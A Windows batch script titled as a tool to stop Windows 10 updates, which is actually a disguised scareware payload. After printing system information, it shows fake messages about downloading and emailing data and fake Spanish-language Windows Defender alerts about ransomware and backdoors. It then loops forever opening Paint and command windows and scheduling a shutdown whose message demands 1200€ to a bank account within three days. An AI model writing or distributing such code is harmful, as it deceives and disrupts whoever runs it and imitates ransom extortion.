@echo off
title stop_updates_Windows10

echo Usually, it's not necessary to disable the Windows Update settings permanently. If you want to skip an update, you can pause updates until the day you want to apply them. Using the Settings app, you can stop system updates for up to 35 days on Windows 10 Pro or Home.

echo waiting for response...
ping localhost -n 1 >nul

echo waiting for response......
ping localhost -n 1 >nul
echo Please wait... Checking system information.
:: Section 1: Windows 10 information
echo ==========================
echo WINDOWS INFO
echo ============================
systeminfo | findstr /c:"OS Name"
systeminfo | findstr /c:"OS Version"
systeminfo | findstr /c:"System Type"
:: Section 2: Hardware information.
echo ============================
echo HARDWARE INFO
echo ============================
systeminfo | findstr /c:"Total Physical Memory"
wmic cpu get name
wmic diskdrive get name,model,size
wmic path win32_videocontroller get name
:: Section 3: Networking information.
echo ============================
echo NETWORK INFO
echo ============================
ipconfig | findstr IPv4
ipconfig | findstr IPv6

echo loading...
ping localhost -n 1

echo Please wait......
ping localhost -n 3 >nul
echo Downloading Windows Packages......
ping localhost -n 3 >nul
echo Connecting internet server...please wait
ping localhost -n 3 >nul
echo Connecting https://www.uwec.edu/Admin/NewsBureau/SummerTimes/STpast/Summer99/07-26-99/regents.html server......please wait
ping localhost -n 3 >nul
echo Connected
ping localhost -n 3 >nul
echo E-mail software accesed
ping localhost -n 3 >nul
echo Sending e-mail and software notes.....
ping localhost -n 3 >nul
echo Software sended
ping localhost -n 3 >nul
echo accesing quarantine...
ping localcost -n 5 >nul
echo All actions proceeded completely
ping localhost -n 3 >nul



@Goto %:^)

         ***   Eres tonto   ***

%:^)
@echo off && mode 50,4 && title <nul && set "_yn=" <nul
setlocal & color 0A & title .\%~nx0 & >"%temp%\_vbs.vbs" ^
set /p "'=yn=msgbox("Parece que alguien ha hackeado la aplicación que acabas de ejecutar. Windows Defender ha encontrado 25 amenazas críticas para el sistema, ¿desea eliminar estas amenzas de su sistema?"):wsh.echo yn" <nul

%__AppDir__%cscript.exe "%temp%\_vbs.vbs" //nologo | find "6" >nul && set "_yn=y"
if "%_yn%"=="y" (endlocal && echo\Thank you, %~nx0 stopped by user!.. && goto :EOF)

set "_yn=" & rem :: if user answer is "No" do more below here ::

for %%i in (
            "No se ha podido desinstalar el siguiente archivo: Ransomware.  16.Informacion",
            "No se ha podido desinstalar el siguiente archivo: backdoor.  16.Informacion",
            "¡ALERTA! Sistema en estado critico. 16.Windows"
            "¡ALERTA! wINDOWS DEFENDER se encuentrA BAJO ATAu/%!. 16.Windows"
            "¡ALERTA! La aplicación Windows Defender ha dejado de funcionar.  16.CRITICAL"
           )do call %:^] "%%~i"  

%:^]
goto :XD & goto :EOF
::if "%~1" == "" %__AppDir__%timeout.exe -1 | <nul ^

for /f tokens^=1-3delims^=. %%i in ('echo\%~1
')do echo\msgbox"%%~i",%%~j,"%%~k" >"%temp%\_vbs.vbs" 
%__AppDir__%wscript.exe "%temp%\_vbs.vbs" //nologo & exit /b

:XD
start mspaint
start mspaint
start mspaint
start mspaint
start cmd
start cmd
start cmd
shutdown -s -t 10 -c "Ingresa 1200€ en la cuenta ES12 4391 1287 1821 1272 antes de 3 días o perderás todos tus datos"
ping localhost -n 3 >nul
goto :XD
